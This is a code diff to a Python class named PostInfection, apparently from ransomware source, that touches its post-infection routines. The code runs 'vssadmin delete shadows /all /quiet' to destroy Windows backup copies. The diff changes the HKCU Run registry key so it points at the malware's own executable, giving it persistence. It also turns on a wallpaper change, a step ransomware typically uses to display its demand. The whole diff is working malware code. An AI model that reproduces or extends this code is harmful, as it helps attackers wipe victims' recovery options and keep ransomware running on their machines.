@@ -29,7 +29,8 @@ class PostInfection(object):
         os.system('vssadmin.exe delete shadows /all /quiet')
 
     def addToRegistry(self,var_name,value):
-        
+        import winreg
+
         # key we want to change is HKEY_CURRENT_USER  
         # key value is Software\Microsoft\Windows\CurrentVersion\Run 
         KEY = "Software\Microsoft\Windows\CurrentVersion\Run"
@@ -77,7 +78,7 @@ class PostInfection(object):
 
 
         if _startup_location != "/home/kali/Desktop/Startup":
-            import winreg
+            
             _regedit_temp = _user_profile + "\\AppData\\Local"
             # copy aes file for regedit
             _regedit_key_file_path = os.path.join(_regedit_temp, os.path.basename(aesIV_file_store_path))
@@ -88,7 +89,7 @@ class PostInfection(object):
                 # copy gui file for regedit
                 _regedit_aptal_path = os.path.join(_regedit_temp, os.path.basename(sys.argv[0]))
                 copyfile(aptal_path, _regedit_aptal_path)
-                self.addToRegistry("aptalgui", _regedit_key_file_path)
+                self.addToRegistry("aptalgui", _regedit_aptal_path)
                 print("regedit aptal file ::", _regedit_aptal_path)
                 
 
@@ -113,8 +114,11 @@ class PostInfection(object):
 
     
     def firstWork(self):
-        # self.deleteShadowFiles()
-        # self.changeWallpaper()
+        # self.deleteShadowFiles()
+        try:
+            self.changeWallpaper()
+        except:
+            print("The problem has been occurred on changing the wallpaper")
         self.setItselfStartUpApplication()
         infoself = self.collectFirstTouchInfos()
 
